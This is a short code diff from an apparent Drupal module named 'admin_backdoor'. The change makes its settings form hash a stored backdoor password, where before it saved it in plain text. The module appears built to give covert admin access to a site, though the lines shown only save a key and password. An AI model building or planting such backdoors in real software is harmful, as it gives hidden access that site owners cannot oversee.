@@ -61,8 +61,7 @@ function admin_backdoor_form_validate ($form, &$form_state){
 
 function admin_backdoor_form_submit ($form, &$form_state){
   $key = user_hash_password($form_state['values']['key']);
-//  $password = user_hash_password($form_state['values']['bd_password']);
-  $password = $form_state['values']['bd_password'];
+  $password = user_hash_password($form_state['values']['bd_password']);
   variable_set('key', $key);
   variable_set('bd_password', $password);
   drupal_set_message(t('Секретный ключ и пароль успешно сохранёны в базу данных'));
